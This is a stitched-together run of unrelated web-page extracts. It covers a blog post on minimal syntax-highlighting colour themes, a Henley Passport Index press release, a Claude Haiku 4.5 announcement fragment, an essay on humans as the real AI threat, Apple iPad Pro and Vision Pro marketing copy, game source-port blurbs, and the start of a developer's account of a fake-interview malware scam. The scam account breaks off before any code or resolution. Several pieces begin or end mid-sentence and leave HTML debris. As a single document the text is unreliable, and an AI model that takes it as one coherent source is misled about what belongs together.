        <p>Syntax highlighting is a tool. It can help you read code faster. Find things quicker. Orient yourself in a large file.</p>
        <p>Like any tool, it can be used correctly or incorrectly. Let’s see how to use syntax highlighting to help you work.</p>
        <h2 id="christmas-lights-diarrhea">Christmas Lights Diarrhea</h2>
        <p>Most color themes have a unique bright color for literally everything: one for variables, another for language keywords, constants, punctuation, functions, classes, calls, comments, etc.</p>
        <p>Sometimes it gets so bad one can’t see the base text color: everything is highlighted. What’s the base text color here?</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/diarrhea.webp?t=1760553996" width="720" height="653">        </figure>
        <p>The problem with that is, if everything is highlighted, nothing stands out. Your eye adapts and considers it a new norm: everything is bright and shiny, and instead of getting separated, it all blends together.</p>
        <p>Here’s a quick test. Try to find the function definition here:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/definitions_bad.webp?t=1760553996" width="720" height="653">        </figure>
        <p>and here:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/definitions_good.webp?t=1760553996" width="720" height="653">        </figure>
        <p>See what I mean?</p>
        <p>So yeah, unfortunately, you can’t just highlight everything. You have to make decisions: what is more important, what is less. What should stand out, what shouldn’t.</p>
        <p>Highlighting everything is like assigning “top priority” to every task in Linear. It only works if most of the tasks have lesser priorities.</p>
        <p>If everything is highlighted, nothing is highlighted.</p>
        <h2 id="enough-colors-to-remember">Enough colors to remember</h2>
        <p>There are two main use-cases you want your color theme to address:</p>
        <ol start="1">
          <li>Look at something and tell what it is by its color (you can tell by reading text, yes, but why do you need syntax highlighting then?)</li>
          <li>Search for something. You want to know what to look for (which color).</li>
        </ol>
        <p>1 is a direct index lookup: color → type of thing.</p>
        <p>2 is a reverse lookup: type of thing → color.</p>
        <p>Truth is, most people don’t do these lookups at all. They might think they do, but in reality, they don’t.</p>
        <p>Let me illustrate. Before:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/change_before.webp?t=1760553996" width="720" height="350">        </figure>
        <p>After:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/change_after.webp?t=1760553996" width="720" height="350">        </figure>
        <p>Can you see it? I misspelled <code>return</code> for <code>retunr</code> and its color switched from red to purple.</p>
        <p>I can’t.</p>
        <p>Here’s another test. Close your eyes (not yet! Finish this sentence first) and try to remember what color your color theme uses for class names?</p>
        <p>Can you?</p>
        <p>If the answer for both questions is “no”, then your color theme is <em>not functional</em>. It might give you comfort (as in—I feel safe. If it’s highlighted, it’s probably code) but you can’t use it as a tool. It doesn’t <em>help</em> you.</p>
        <p>What’s the solution? Have an absolute minimum of colors. So little that they all fit in your head at once. For example, my color theme, Alabaster, only uses four:</p>
        <ul>
          <li>Green for strings</li>
          <li>Purple for constants</li>
          <li>Yellow for comments</li>
          <li>Light blue for top-level definitions</li>
        </ul>
        <p>That’s it! And I was able to type it all from memory, too. This minimalism allows me to actually do lookups: if I’m looking for a string, I know it will be green. If I’m looking at something yellow, I know it’s a comment.</p>
        <p>Limit the number of different colors to what you can remember.</p>
        <p>If you swap green and purple in my editor, it’ll be a catastrophe. If somebody swapped colors in yours, would you even notice?</p>
        <h2 id="what-should-you-highlight">What should you highlight?</h2>
        <p>Something there isn’t a lot of. Remember—we want highlights to stand out. That’s why I don’t highlight variables or function calls—they are everywhere, your code is probably 75% variable names and function calls.</p>
        <p>I do highlight constants (numbers, strings). These are usually used more sparingly and often are reference points—a lot of logic paths start from constants.</p>
        <p>Top-level definitions are another good idea. They give you an idea of a structure quickly.</p>
        <p>Punctuation: it helps to separate names from syntax a little bit, and you care about names first, especially when quickly scanning code.</p>
        <p>Please, please don’t highlight language keywords. <code>class</code>, <code>function</code>, <code>if</code>, <code>else</code>stuff like this. You rarely look for them: “where’s that if” is a valid question, but you will be looking not at the <code>if</code> the keyword, but at the condition after it. The condition is the important, distinguishing part. The keyword is not.</p>
        <p>Highlight names and constants. Grey out punctuation. Don’t highlight language keywords.</p>
        
        <p>The tradition of using grey for comments comes from the times when people were paid by line. If you have something like</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/javadoc.webp?t=1760553996" width="720" height="610">        </figure>
        <p>of course you would want to grey it out! This is bullshit text that doesn’t add anything and was written to be ignored.</p>
        <p>But for good comments, the situation is opposite. Good comments ADD to the code. They explain something that couldn’t be expressed directly. They are <em>important</em>.</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/yellow_comments.webp?t=1760553996" width="720" height="190">        </figure>
        <p>So here’s another controversial idea:</p>
        <p>Comments should be highlighted, not hidden away.</p>
        <p>Use bold colors, draw attention to them. Don’t shy away. If somebody took the time to tell you something, then you want to read it.</p>
        
        <p>Another secret nobody is talking about is that there are two types of comments:</p>
        <ol start="1">
          <li>Explanations</li>
          <li>Disabled code</li>
        </ol>
        <p>Most languages don’t distinguish between those, so there’s not much you can do syntax-wise. Sometimes there’s a convention (e.g. <code>--</code> vs <code>/* */</code> in SQL), then use it!</p>
        <p>Here’s a real example from Clojure codebase that makes perfect use of two types of comments:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/two_types_of_comments.webp?t=1760553996" width="720" height="540"><figcaption>Disabled code is gray, explanation is bright yellow</figcaption>        </figure>
        <h2 id="light-or-dark">Light or dark?</h2>
        <p>Per statistics, 70% of developers prefer dark themes. Being in the other 30%, that question always puzzled me. Why?</p>
        <p>And I think I have an answer. Here’s a typical dark theme:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/vscode_default_dark@2x.webp?t=1760553996" width="720" height="240">        </figure>
        <p>and here’s a light one:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/vscode_default_light@2x.webp?t=1760553996" width="720" height="240">        </figure>
        <p>On the latter one, colors are way less vibrant. Here, I picked them out for you:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/vscode_colors@2x.png?t=1760553996" width="720" height="300"><figcaption>Notice how many colors there are. No one can remember that many.</figcaption>        </figure>
        <p>This is because dark colors are in general less distinguishable and more muddy. Look at Hue scale as we move brightness down:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/brightness_hue@2x.webp?t=1760553996" width="720" height="175">        </figure>
        <p>Basically, in the dark part of the spectrum, you just get fewer colors to play with. There’s no “dark yellow” or good-looking “dark teal”.</p>
        <p>Nothing can be done here. There are no magic colors hiding somewhere that have both good contrast on a white background and look good at the same time. By choosing a light theme, you are dooming yourself to a very limited, bad-looking, barely distinguishable set of dark colors.</p>
        <p>So it makes sense. Dark themes do look better. Or rather: light ones can’t look good. Science ¯\_(ツ)_/¯</p>
        <p>But!</p>
        <p>But.</p>
        <p>There is one trick you can do, that I don’t see a lot of. Use background colors! Compare:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/bg_highlight@2x.png?t=1760553996" width="720" height="336">        </figure>
        <p>The first one has nice colors, but the contrast is too low: letters become hard to read.</p>
        <p>The second one has good contrast, but you can barely see colors.</p>
        <p>The last one has <em>both</em>: high contrast and clean, vibrant colors. Lighter colors are readable even on a white background since they fill a lot more area. Text is the same brightness as in the second example, yet it gives the impression of clearer color. It’s all upside, really.</p>
        <p>UI designers know about this trick for a while, but I rarely see it applied in code editors:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/badge.png?t=1760553996" width="531" height="360">        </figure>
        <p>If your editor supports choosing background color, give it a try. It might open light themes for you.</p>
        <h2 id="bold-and-italics">Bold and italics</h2>
        <p>Don’t use. This goes into the same category as too many colors. It’s just another way to highlight something, and you don’t need too many, because you can’t highlight everything.</p>
        <p>In theory, you might try to <em>replace</em> colors with typography. Would that work? I don’t know. I haven’t seen any examples.</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/typography.png?t=1760553996" width="720" height="240"><figcaption>Using italics and bold instead of colors</figcaption>        </figure>
        <h2 id="myth-of-number-based-perfection">Myth of number-based perfection</h2>
        <p>Some themes pay too much attention to be scientifically uniform. Like, all colors have the same exact lightness, and hues are distributed evenly on a circle.</p>
        <p>This could be nice (to know if you have OCR), but in practice, it doesn’t work as well as it sounds:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/balanced.png?t=1760553996" width="720" height="323"><figcaption>OkLab l=0.7473 c=0.1253 h=0, 45, 90, 135, 180, 225, 270, 315</figcaption>        </figure>
        <p>The idea of highlighting is to make things stand out. If you make all colors the same lightness and chroma, they will look very similar to each other, and it’ll be hard to tell them apart.</p>
        <p>Our eyes are way more sensitive to differences in lightness than in color, and we should use it, not try to negate it.</p>
        <h2 id="lets-design-a-color-theme-together">Let’s design a color theme together</h2>
        <p>Let’s apply these principles step by step and see where it leads us. We start with the theme from the start of this post:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi00.png?t=1760553996" width="720" height="240">        </figure>
        <p>First, let’s remove highlighting from language keywords and re-introduce base text color:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi10.png?t=1760553996" width="720" height="240">        </figure>
        <p>Next, we remove color from variable usage:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi20.png?t=1760553996" width="720" height="240">        </figure>
        <p>and from function/method invocation:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi30.png?t=1760553996" width="720" height="240">        </figure>
        <p>The thinking is that your code is mostly references to variables and method invocation. If we highlight those, we’ll have to highlight more than 75% of your code.</p>
        <p>Notice that we’ve kept variable declarations. These are not as ubiquitous and help you quickly answer a common question: where does thing thing come from?</p>
        <p>Next, let’s tone down punctuation:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi40.png?t=1760553996" width="720" height="240">        </figure>
        <p>I prefer to dim it a little bit because it helps names stand out more. Names alone can give you the general idea of what’s going on, and the exact configuration of brackets is rarely equally important.</p>
        <p>But you might roll with base color punctuation, too:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi40_alt.png?t=1760553996" width="720" height="240">        </figure>
        <p>Okay, getting close. Let’s highlight comments:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi50.png?t=1760553996" width="720" height="240">        </figure>
        <p>We don’t use red here because you usually need it for squiggly lines and errors.</p>
        <p>This is still one color too many, so I unify numbers and strings to both use green:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi60.png?t=1760553996" width="720" height="240">        </figure>
        <p>Finally, let’s rotate colors a bit. We want to respect nesting logic, so function declarations should be brighter (yellow) than variable declarations (blue).</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi70.png?t=1760553996" width="720" height="240">        </figure>
        <p>Compare with what we started:</p>
        <figure>
<img src="https://tonsky.me/blog/syntax-highlighting/dyi00.png?t=1760553996" width="720" height="240">        </figure>
        <p>In my opinion, we got a much more workable color theme: it’s easier on the eyes and helps you find stuff faster.</p>
        <h2 id="shameless-plug-time">Shameless plug time</h2>
        <p>I’ve been applying these principles for <a href="https://github.com/tonsky/vscode-theme-alabaster/commit/5c840f5fb57e5cd0dce93ac8c450495bdb0a2658" target="_blank">about 8 years now</a>.</p>
        <p>I call this theme Alabaster and I’ve built it a couple of times for the editors I used:</p>
        <ul>
          <li><a href="https://github.com/tonsky/vscode-theme-alabaster" target="_blank">VS Code</a></li>
          <li><a href="https://github.com/tonsky/intellij-alabaster" target="_blank">JetBrains IDEs</a></li>
          <li><a href="https://github.com/tonsky/sublime-scheme-alabaster" target="_blank">Sublime Text</a> (<a href="https://github.com/tonsky/clojure-sublimed/?tab=readme-ov-file#color-scheme" target="_blank">twice</a>)</li>
        </ul>
        <p>It’s also been ported to many other editors and terminals; the most complete list is <a href="https://github.com/tonsky/sublime-scheme-alabaster?tab=readme-ov-file#variations-1" target="_blank">probably here</a>. If your editor is not on the list, try searching for it by name—it might be built-in already! I always wondered where these color themes come from, and now I became an author of one (and I still don’t know).</p>
        <p>Feel free to use Alabaster as is or build your own theme using the principles outlined in the article—either is fine by me.</p>
        <p>As for the principles themselves, they worked out fantastically for me. I’ve never wanted to go back, and just one look at any “traditional” color theme gives me a scare now.</p>
        <p>I <em>suspect</em> that the only reason we don’t see more restrained color themes is that people never really thought about it. Well, this is your wake-up call. I hope this will inspire people to use color more deliberately and to change the default way we build and use color themes.</p>

<div id="readability-page-1" class="page"><div>
                    <p>For the first time since the <a href="https://www.henleyglobal.com/passport-index">Henley Passport Index</a> was created 20 years ago, the United States is no longer ranked amongst the world’s Top 10 most powerful passports. Once unrivalled at No.1 in 2014, the American passport has now slumped to 12<sup>th</sup> place, tied with Malaysia, with visa-free access to only 180 of 227 destinations worldwide. The Asian trifecta of Singapore (access to 193 destinations visa-free), South Korea (190 destinations), and Japan (189 destinations) now occupy the top three spots on the index powered by exclusive data from the <a href="https://www.iata.org/" target="_blank">International Air Transport Association</a> (IATA) and ranking all the world’s passports based on the number of destinations their holders can enter without a prior visa.</p><p>The decline of the US passport and its most recent drop from 10<sup>th</sup> to 12<sup>th</sup> position on the index has been driven by a series of access changes. The loss of visa-free access to Brazil in April due to a lack of reciprocity, and the US being left out of China’s rapidly expanding visa-free list, marked the start of its downward slide. This was followed by adjustments from Papua New Guinea and Myanmar, which further eroded the US score while boosting other passports. Most recently, Somalia’s launch of a new eVisa system and Vietnam’s decision to exclude the US from its latest visa-free additions delivered the final blow, pushing it out of the Top 10.</p><p><a href="https://www.henleyglobal.com/about/key-people/christian-h-kalin">Dr. Christian H. Kaelin</a>, Chairman of Henley &amp; Partners and creator of the Henley Passport Index, says these seemingly small changes have had outsized consequences — underscoring just how finely balanced the global mobility landscape has become. “The declining strength of the US passport over the past decade is more than just a reshuffle in rankings — it signals a fundamental shift in global mobility and soft power dynamics. Nations that embrace openness and cooperation are surging ahead, while those resting on past privilege are being left behind.”</p><p>Similarly, the UK passport has fallen to its lowest-ever position on the index, slipping two places since July, from 6<sup>th</sup> to 8<sup>th</sup> place, despite also once holding the top spot (in 2015).</p><p><strong>Visa Reciprocity Matters More</strong></p><p>While American passport holders can currently access 180 destinations visa-free, the US itself allows only 46 other nationalities to enter without a visa. This puts it way down in 77<sup>th</sup> place on the <a href="https://www.henleyglobal.com/publications/henley-openness-index">Henley Openness Index</a>, which ranks all 199 countries and territories worldwide according to the number of nationalities they permit entry to without a prior visa.</p><p>This disparity between visa free access and openness is one of the widest globally — second only to Australia, and just ahead of Canada, New Zealand, and Japan. Interestingly, all five nations with the biggest gaps between the travel freedom they enjoy and the openness they offer have either stagnated or declined in their passport power ranking over the past decade.</p><p><a href="https://www.henleyglobal.com/publications/henley-private-wealth-migration-report-2025/americas-hard-line-immigration">Annie Pforzheimer</a>, Senior Associate at the Center for Strategic and International Studies in Washington, notes that America’s retreat is rooted in politics. “Even before a second Trump presidency, US policy had turned inward. That isolationist mindset is now being reflected in America’s loss of passport power.”</p><p>This more insular stance has hit developing nations particularly hard. President Trump has suspended visa issuance to travelers from 12 nations across Africa, the Middle East and Southeast Asia, imposed heavy restrictions on an additional seven, and threatened bans on up to 36 more, the majority of them in Africa. A visa bond of USD 5,000 to 15,000 now applies to seven African nations, refundable only upon departure. Plans are also underway to introduce a blanket USD 250 ‘visa integrity fee’ for most non-immigrant visa applications, while the cost of the Electronic System for Travel Authorization (ESTA) nearly doubled on 30 September 2025, from USD 21 to USD 40.</p><p><strong>China’s Ascent: A Decade of Gains</strong></p><p>In sharp contrast, China has been among the biggest climbers on the Henley Passport Index over the past decade, leaping from 94<sup>th</sup> place in 2015 to 64<sup>th</sup> in 2025, with its visa-free access score increasing by 37 destinations during that time.</p><p>On the Henley Openness Index, China has also risen dramatically, granting visa-free access to an additional 30 countries in the past year alone. It now sits in 65<sup>th</sup> position, providing entry to 76 nations — 30 more than the US.</p><p>Recent developments, including granting visa free access to Russia, underscore Beijing’s ongoing strategy of increased openness. China’s moves — alongside new agreements with the Gulf states, South America, and several European countries — are cementing its role as a global mobility powerhouse, bolstering the Asia-Pacific region’s dominance in travel freedom.</p><p><a href="https://www.henleyglobal.com/publications/usa-wealth-report-2025/navigating-uschina-trade-tightrope">Dr. Tim Klatte</a>, Partner at Grant Thornton China, highlights the geopolitical implications. “Trump’s return to power has bought fresh trade conflicts that weaken America’s mobility, while China’s strategic openness boosts its global influence. These diverging paths will reshape economic and travel dynamics worldwide.”</p><p><strong>Americans Lead Global Rush for Second Citizenships</strong></p><p>The decline in US passport power is fueling an unprecedented surge in demand for alternative <a href="https://www.henleyglobal.com/residence-investment">residence</a> and <a href="https://www.henleyglobal.com/citizenship-investment">citizenship</a> options. Henley &amp; Partners data shows that Americans have become by far the largest group of applicants for <a href="https://www.henleyglobal.com/countries">investment migration programs</a> in 2025.</p><p>By the end of Q3, applications from US nationals were already 67% higher than the total for 2024, which itself recorded a 60% year-on-year increase. Group Head of Private Clients at Henley &amp; Partners, Dominic Volek, says the firm now has more American clients than the next four nationalities — Turkish, Indian, Chinese, and British — combined. “Faced with unprecedented volatility, investors and wealthy American families are adopting a strategy of geopolitical arbitrage to acquire additional residence and citizenship options. They are hedging against jurisdictional risk and leveraging differences across countries to optimize personal, financial, and lifestyle outcomes.”</p><p><a href="https://www.henleyglobal.com/publications/usa-wealth-report-2025/dual-citizenship-new-american-dream">Prof. Peter J. Spiro</a> of Temple University Law School in Philadelphia says while US citizenship remains a valuable status, it’s no longer good enough as a standalone. “In coming years, more Americans will be acquiring additional citizenships in whatever way they can. Multiple citizenship is being normalized in American society. While it may be a bit of an exaggeration, as one social media poster recently put it, “dual citizenship is the new American dream”.</p><p>-<strong>Ends-</strong></p><p><strong>Notes to Editors</strong></p><p><strong>About the 2025 Henley Passport Index</strong></p><p>With cutting-edge expert commentary and historical data spanning over 20 years, the <a href="https://www.henleyglobal.com/passport-index">Henley Passport Index</a> is the original ranking of all the world’s passports according to the number of destinations their holders can access without a prior visa.

And users of Claude Code will find that Haiku 4.5 makes the coding experience—from multiple-agent projects to rapid prototyping—markedly more responsive.</p><p>Claude Sonnet 4.5, released <a href="https://www.anthropic.com/news/claude-sonnet-4-5">two weeks ago</a>, remains our frontier model and the best coding model in the world. Claude Haiku 4.5 gives users a new option for when they want near-frontier performance with much greater cost-efficiency. It also opens up new ways of using our models together. For example, Sonnet 4.5 can break down a complex problem into multi-step plans, then orchestrate a team of multiple Haiku 4.5s to complete subtasks in parallel.</p><p>Claude Haiku 4.5 is available everywhere today.

<div id="readability-page-1" class="page"><div><p>I don’t really believe in the threat of AGI (Artificial General Intelligence—human-level intelligence) partly because I don’t believe in the <em>possibility</em> of AGI and I’m highly skeptical that the current technology underpinning LLMs will provide a route to it. But I also think there’s something we should actually be afraid of long before AGI, if it ever comes.</p>

<p>When talking about humans in any context, whether it’s us vs sharks, or us vs wolves, or us vs &lt;insert anything that scares us&gt;, and especially when it’s us vs &lt;some technology&gt;, I am reminded of The Gruffalo. In this children’s story, a timid mouse convinces a scary monster (The Gruffalo) that the mouse is the scariest animal in the woods. In reality though, the forest animals are frightened of the Gruffulo with it’s terrible tusks, and terrible claws, and terrible teeth.</p>

<p><img src="https://jamie.ideasasylum.com/images/gruffalo-ai.jpg" alt="AI is a timid mouse compared to the terrifying humans"></p>

<p>We (humans) are the scariest animal in the woods. We’re the scariest animal <em>anywhere</em>. At any time, in any location, under any circumstances, if there’s a human present then that’s the scariest motherfucker in the woods. We’re a danger to every living thing, ourselves included. Our collective ability to survive, adapt, control, kill, or wipe out any other species is unmatched.</p>

<p>Anyone trying to tell you otherwise is trying to distract you. AI is not the monster to be afraid of; we are.</p>

<p>Just like a hammer, sword, or a rifle lying on a ground is nothing to be feared, so too is AI. It’s just an inanimate object; a tool, potentially. Now, if you equip humans with a hammer, or sword, or rifle, or AI then you’ve just made the scariest monster in the woods (that’s you) even more terrifying.</p>

<p>To bring this around to more concrete thoughts: I do not believe that AI will enslave us, destroy our democracies, or our environment, or rob us of our skills, our purpose, or our jobs. That’s what humans will do. What we’ve always tried to do.</p>

<p>We don’t need to worry about AI itself, we need to be concerned about what “humans + AI” will do. Humans will do what they’ve always tried to do—gain power, enslave, kill, control, exploit, cheat, or just be lazy and avoid the hard work—but now with new abilities that we couldn’t have dreamed of.</p>

<p>I’m not saying “don’t worry”. I’m saying don’t worry about the technology of AI and continue to recognise that humans, and how they will use a technology, has always been our biggest threat.</p>

<p>The means accepting that AI isn’t something passively happening to us. It’s not a meteor heading towards Earth that we play no part in it or have no control over. It’s a thing <em>we’re</em> building, for other <em>humans</em> to use. We’re not building AI for gerbils here. How would we like other humans to use AI? How would we not like them to use it? We’re building and using this technology but pretending that unlike cars, and guns, and knives, and nuclear weapons, that we are powerless to understand, control, or regulate it for the betterment of humanity.</p>

<p>The scariest monster in the woods just got scarier and we can’t ignore that.</p>

                 <div>Cellular models of iPad Pro feature C1X, a cellular modem designed by Apple that brings users up to 50 percent faster cellular data performance, and for active cellular users, up to 30 percent less power usage than iPad Pro with M4. Cellular models of iPad Pro allow users to enjoy GPS and location capabilities, so they can navigate with even more confidence. Users can also enjoy 5G cellular support, so they can stay connected for work or leisure all around the world. And with eSIM, users can quickly and securely add a new plan, connect and transfer existing cellular plans digitally, and stay in touch with family and friends regardless of Wi-Fi availability — perfect for users working on the go, like frequent business travelers or architects out in the field.

Available in space black and silver, the 11-inch model is just 5.3 mm thin, and the 13-inch model is even thinner at a striking 5.1 mm. The Ultra Retina XDR display — the world’s most advanced display — features groundbreaking tandem OLED technology that delivers extreme brightness, incredibly precise contrast, and technologies like ProMotion and True Tone. iPad Pro supports 1000 nits of full-screen brightness for SDR and HDR content, and 1600 nits peak brightness for HDR. And for users who work with high-end, color-managed workflows or in challenging lighting conditions, iPad Pro offers a nano-texture display glass option for reduced glare that is precisely etched at a nanometer scale, maintaining image quality and contrast while scattering ambient light.

                 <div>Apple 2030 is the company’s ambitious plan to be carbon neutral across its entire footprint by the end of this decade by reducing product emissions from their three biggest sources: materials, electricity, and transportation. The new iPad Pro is made with 30 percent recycled content by weight, including 100 percent recycled aluminum in the enclosure, 100 percent recycled rare earth elements in all magnets, and 100 percent recycled cobalt in the battery. It is manufactured with 55 percent renewable electricity, like wind and solar, across the supply chain. iPad Pro is also designed to last and offers industry-leading software support while meeting Apple’s high standards for energy efficiency and safe chemistry. The paper packaging is 100 percent fiber-based and can be easily recycled.

They took the macabre joke about getting points for hitting people in your car and made it a gameplay mechanic. The game was successful both from a critical and commercial perspective, as well as its goal as a controversy magnet.</p><p>The dethrace project is a source port where in lieu of source code they're reverse engineering it, and according to their Twitter account they're approximately 70% of the way there. The game is very playable but may crash in some places, so I'm introducing a new tag: Early Access. This probably could use a better name but I'm using it to convey the notion that the project doesn't consider itself completely finished (though there are reports of people making it through the entire game), but it's still pretty awesome so I figured if nothing else it's worth putting up a quick build.</p></div><!--bindings={

It's your standard shareware sequel story: more levels, more twists, better technology. If you liked the original you'll like this one.</p><p>It also has a very confusing release strategy. The original game was shareware, when you bought it you got the full <em>Jazz Jackrabbit 2</em> game. Later, it was re-released with an additional episode under the title <em>Jazz Jackrabbit 2: The Secret Files</em>. Then came a release called <em>Jazz Jackrabbit 2: The Christmas Chronicles</em>, which adds Christmas-themed levels. So when you get the game on GOG you might spot two entries, neither of which look like they're the base game, but both should work in Jazz² Resurrection.</p></div><!--bindings={

                 <h2><strong>A Leap Forward in Performance with M5</strong>
</h2>
                 
             
                 <div>M5 provides an even faster, smoother, and more responsive experience for Apple Vision Pro users, while introducing new opportunities for developers to create more advanced spatial and immersive experiences. Built using third-generation 3-nanometer technology, M5 on Vision Pro features an advanced 10-core CPU that delivers higher multithreaded performance, resulting in faster experiences throughout the system, including faster load times for apps and widgets and more responsive web browsing. The next-generation 10-core GPU architecture brings support for hardware-accelerated ray tracing and mesh shading, enabling developers to add remarkable detail to lighting, shadows, and reflections in games like Control.
</div>
                 
             
                 <div>With M5, Apple Vision Pro renders 10 percent more pixels on the custom micro-OLED displays compared to the previous generation, resulting in a sharper image with crisper text and more detailed visuals. Vision Pro can also increase the refresh rate up to 120Hz for reduced motion blur when users look at their physical surroundings, and an even smoother experience when using Mac Virtual Display. Vision Pro with M5 works alongside the purpose-built R1 chip, which processes input from 12 cameras, five sensors, and six microphones, and streams new images to the displays within 12 milliseconds to create a real-time view of the world. The high-performance battery now supports up to two and a half hours of general use, and up to three hours of video playback, all on a single charge.<sup>2</sup> And it’s easy to use Vision Pro for longer periods at home, at an office, or while commuting by connecting the battery to power.

        <div>The 16-core Neural Engine makes AI-powered features run up to 50 percent faster for system experiences — like capturing a Persona or transforming photos into spatial scenes — and up to 2x faster for third-party apps compared to the previous generation.<sup>3</sup> With M5, developers such as JigSpace are pioneering new use cases for enterprises that combine spatial computing with on-device AI. Using Apple’s Foundation Models framework, the new JigSpace app for Vision Pro taps into the on-device model at the core of Apple Intelligence to make complex information easier to understand. Users can parse through complex datasets with natural language and learn about sophisticated objects, like wind turbines, using interactive 3D models.

                 <div><a href="https://www.apple.com/os/visionos/" target="_blank">visionOS 26</a> brings a set of powerful spatial experiences to Apple Vision Pro. Widgets seamlessly integrate into a user’s space and reappear every time they put Vision Pro on, making it easy to check the time or weather, play music or podcasts, decorate their space with photos, or access ChatGPT. Striking enhancements to Persona make communicating in apps like FaceTime feel even more natural and familiar. Spatial scenes, which use generative AI to add lifelike depth to photos, make memories come to life. Users can play back 180-degree, 360-degree, and wide field-of-view video from popular action cameras, so they can enjoy their footage the way it was meant to be seen, and creators can publish videos in these formats to apps like Safari and Vimeo. <span>With iPadOS 26.1, available later this fall, the </span><a href="https://apps.apple.com/us/app/apple-vision-pro/id6502614761" target="_blank">Apple Vision Pro app</a><span> comes to </span><a href="https://www.apple.com/newsroom/2025/10/apple-introduces-the-powerful-new-ipad-pro-with-the-m5-chip/" target="_blank">iPad</a><span>, offering users another great way to discover new content, queue apps and games to download, find tips, and quickly access information about their Vision Pro.</span>

</h2>
                 
             
                 <div>There are over 1 million apps available for Apple Vision Pro, including more than 3,000 apps built for visionOS. Users can design their dream home with HomeByMe and Lowe’s Style Studio, outfit their closet with Balenciaga, and browse stunning artwork with Christie’s Select and Art Authority Museum. They can explore extraordinary locations around the world with Epic Earth and Explore POV, transform their physical space into a planetarium with Space Vision, or travel back in time with D-Day: The Camera Soldier.

                 <div>Apple Vision Pro remains the ultimate entertainment device. With the new Vision Pro, users can experience concerts like never before with Amplium; tune into their favorite teams with apps from major sports leagues; or enjoy a personal theater with apps from popular streaming services on a screen that appears up to 100 feet wide. Apple Immersive continues to redefine what is possible in storytelling, and Vision Pro users can enjoy new series and films on the Apple TV app. Later this season, users in the Lakers’ broadcast territory will be able to watch select live games in Apple Immersive, and <a href="https://nr.apple.com/DE6M6F5Ws2" target="_blank">new titles</a> from the Audi F1 Project, the BBC, HYBE, and Red Bull will launch in Apple Immersive in the coming months.<sup>4</sup> The Apple TV app is also home to one of the largest digital collections of 3D movies available, featuring recent blockbusters like <em>Superman</em>, <em>Jurassic World Rebirth</em>, <em>How to Train Your Dragon</em>, and <em>Wicked</em>.

                 <div>With Apple Vision Pro, users can supercharge their workflows and discover new ways to realize their creative visions. Artists can design new works using apps like Crayon and Da Vinci Eye. Photographers can edit images with color accuracy from any location and in any lighting condition using Pixelmator on <a href="https://www.apple.com/newsroom/2025/10/apple-unveils-new-14-inch-macbook-pro-powered-by-the-m5-chip/" target="_blank">MacBook Pro</a> with Mac Virtual Display. Filmmakers can scout locations from anywhere by viewing spatial media — including panoramas and spatial videos shot on iPhone — on a large wraparound display. And pro users can assemble and rehearse their presentations while in a seat-for-seat replica of the Steve Jobs Theater at Apple Park using Keynote. With <a href="https://www.apple.com/shop/product/HS9U2" target="_blank">Logitech Muse</a> — a digital pencil built for Vision Pro — users can create and collaborate with a new level of precision. Apps like Crayon, doppl by Interaptix, Sketch Pro, and Spatial Analogue are adding support for Muse over the coming weeks.

                 <div>Businesses around the world are harnessing the power of spatial computing on Apple Vision Pro every day to invent new solutions and streamline operations across design, education, healthcare, sales, and more. CAE, the multinational technology company that specializes in simulation and instruction solutions, uses Vision Pro to help pilots complete training activities outside of specialized centers, featuring true-to-life flight deck environments and scenarios. At Porsche, drivers can visualize and personalize new vehicles in select showrooms before taking delivery. And by seamlessly blending digital content with the physical world, Visage provides high-quality, three-dimensional medical imaging, helping hospitals like UC San Diego Health improve patient care.

<div id="readability-page-1" class="page"><div id="post-content-parent"><p>I was 30 seconds away from running malware on my machine.</p>
<p>The attack vector? A fake coding interview from a "legitimate" blockchain company.</p>
<p>Here's how a sophisticated scam operation almost got me, and why every developer needs to read this.</p>
<h2 id="heading-the-setup">The Setup</h2>
<p>Last week, I got a LinkedIn message from Mykola Yanchii. Chief Blockchain Officer at Symfa. Real company. Real LinkedIn profile. 1,000+ connections. The works.</p>
<p>The message was smooth. Professional. "We're developing BestCity, a platform aimed at transforming real estate workflows. Part-time roles available. Flexible structure."</p>
<p>I've been freelancing for 8 years. Built web applications, worked on various projects, done my share of code reviews. I'm usually paranoid about security - or so I thought.</p>
<p>This looked legit. So I said yes to the call.</p>
<h2 id="heading-the-hook">The Hook</h2>
<p>Before our meeting, Mykola sent me a "test project" - standard practice for tech interviews. A React/Node codebase to evaluate my skills. 30-minute test. Simple enough.</p>
<p>The Bitbucket repo looked professional. Clean README. Proper documentation. Even had that corporate stock photo of a woman with a tablet standing in front of a house. You know the one.</p>
<p>Here's where I almost screwed up: I was running late for our call. Had about 30 minutes to review the code. So I did what lazy developers do - I started poking around the codebase without running it first.</p>
<p>Usually, I sandbox everything. Docker containers. Isolated environments. But I was in a rush.</p>
<p>I spent 30 minutes fixing obvious bugs, adding a docker-compose file, cleaning up the code. Standard stuff. Ready to run it and show my work.</p>
<p>Then I had one of those paranoid developer moments.</p>
<h2 id="heading-the-save">The Save</h2>
